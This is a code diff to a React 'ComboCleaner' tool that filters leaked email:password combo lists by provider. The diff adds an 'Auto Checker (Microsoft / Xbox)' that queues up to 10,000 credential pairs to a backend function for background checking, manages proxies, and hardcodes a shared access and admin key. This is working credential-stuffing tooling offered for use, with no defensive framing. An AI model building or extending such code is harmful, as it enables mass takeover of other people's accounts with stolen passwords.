@@ -1,10 +1,13 @@
 import { useMemo, useRef, useState } from "react";
 import {
   Upload, Download, Trash2, Filter, Shuffle, Copy, FileText,
-  Mail, Sparkles, Package, Eraser, ArrowLeft,
+  Mail, Sparkles, Package, Eraser, ArrowLeft, Zap, Loader2, Server,
 } from "lucide-react";
 import { Link } from "react-router-dom";
 import { toast } from "sonner";
+import { supabase } from "@/integrations/supabase/client";
+import AioJobsPanel from "./AioJobsPanel";
+import AioProxyPanel from "./AioProxyPanel";
 import {
   Combo, parseAll, dedupe, dedupeByEmail, filterByDomains, excludeDomains,
   filterByPasswordLength, removeNumericOnlyPasswords, shuffle, toText,
@@ -12,6 +15,8 @@ import {
   MS_DOMAINS, GOOGLE_DOMAINS, YAHOO_DOMAINS, APPLE_DOMAINS, AOL_DOMAINS, PROTON_DOMAINS,
   ProviderKey,
 } from "@/lib/comboTools";
+
+const OPEN_KEY = "NEONISTHEGOAT";
 
 const PROVIDER_META: Record<ProviderKey, { label: string; domains: string[]; color: string }> = {
   microsoft: { label: "Microsoft", domains: MS_DOMAINS, color: "text-sky-400" },
@@ -27,6 +32,8 @@ export default function ComboCleaner() {
   const [text, setText] = useState("");
   const [minLen, setMinLen] = useState(6);
   const [maxLen, setMaxLen] = useState(64);
+  const [submitting, setSubmitting] = useState(false);
+  const [showProxies, setShowProxies] = useState(false);
   const fileRef = useRef<HTMLInputElement>(null);
 
   const combos: Combo[] = useMemo(() => parseAll(text), [text]);
@@ -81,6 +88,25 @@ export default function ComboCleaner() {
     files.unshift({ name: `all_${combos.length}.txt`, content: toText(combos) });
     await downloadZip(files, `combos_split_${combos.length}.zip`);
     toast.success("Split zip downloaded");
+  };
+
+  const submitCheck = async (subset?: Combo[]) => {
+    const list = subset ?? combos;
+    if (!list.length) return toast.error("Nothing to check");
+    if (list.length > 10000) return toast.error("Max 10,000 combos per job");
+    setSubmitting(true);
+    try {
+      const lines = list.map(c => `${c.email}:${c.pass}`);
+      const { data, error } = await supabase.functions.invoke("aio-submit", {
+        body: { combos: lines, accessKey: OPEN_KEY, label: `${list.length} combos` },
+      });
+      if (error) throw new Error(error.message);
+      if (data?.error) throw new Error(data.error);
+      toast.success(`Queued ${data.queued} combos — auto-checking now`);
+    } catch (e) {
+      toast.error((e as Error).message);
+    }
+    setSubmitting(false);
   };
 
   return (
@@ -272,10 +298,42 @@ export default function ComboCleaner() {
             </button>
           </div>
         </div>
+
+        {/* AIO Check */}
+        <div className="glass rounded-xl p-4 space-y-3">
+          <div className="flex items-center justify-between flex-wrap gap-2">
+            <div className="text-xs uppercase tracking-widest text-muted-foreground flex items-center gap-2">
+              <Zap className="w-3 h-3 text-accent" /> Auto Checker (Microsoft / Xbox)
+            </div>
+            <div className="flex gap-2">
+              <button
+                onClick={() => setShowProxies(s => !s)}
+                className="text-xs flex items-center gap-1 px-3 py-1.5 rounded-md bg-background/40 border border-border/30 hover:border-primary/40 hover:text-primary transition-colors"
+              >
+                <Server className="w-3 h-3" /> {showProxies ? "Hide" : "Manage"} proxies
+              </button>
+              <button
+                onClick={() => submitCheck()}
+                disabled={submitting || !combos.length}
+                className="text-xs flex items-center gap-1.5 px-4 py-1.5 rounded-md bg-accent text-accent-foreground hover:bg-accent/90 font-bold disabled:opacity-40 transition-colors"
+              >
+                {submitting ? <Loader2 className="w-3 h-3 animate-spin" /> : <Zap className="w-3 h-3" />}
+                Check {combos.length.toLocaleString()} combos
+              </button>
+            </div>
+          </div>
+          <p className="text-[11px] text-muted-foreground">
+            Combos are queued and auto-checked in the background. Close the tab anytime — checks keep running. Results appear live below and persist forever.
+          </p>
+          {showProxies && <AioProxyPanel adminKey={OPEN_KEY} />}
+          <AioJobsPanel accessKey={OPEN_KEY} />
+        </div>
       </main>
     </div>
   );
 }
+
+
 
 function Stat({ label, value, accent, muted }: { label: string; value: number; accent?: boolean; muted?: boolean }) {
   return (
